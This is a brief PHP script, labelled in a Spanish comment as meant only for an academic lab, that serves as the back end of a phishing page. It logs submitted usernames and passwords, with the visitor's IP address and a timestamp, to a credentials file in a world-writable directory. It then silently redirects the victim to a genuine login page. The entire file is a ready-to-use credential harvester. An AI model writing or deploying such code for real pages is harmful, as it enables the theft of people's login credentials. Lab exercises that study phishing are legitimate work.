<?php
// Uso exclusivo en el laboratorio académico. No usar con datos reales.
$dir = __DIR__ . '/captures';
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}
$line = sprintf(
    "%s\t%s\t%s\t%s\n",
    gmdate('c'),
    $_SERVER['REMOTE_ADDR'] ?? '',
    $_POST['username'] ?? '',
    $_POST['password'] ?? ''
);
file_put_contents($dir . '/creds.log', $line, FILE_APPEND | LOCK_EX);
header('Location: http://edge/login.php');
exit;
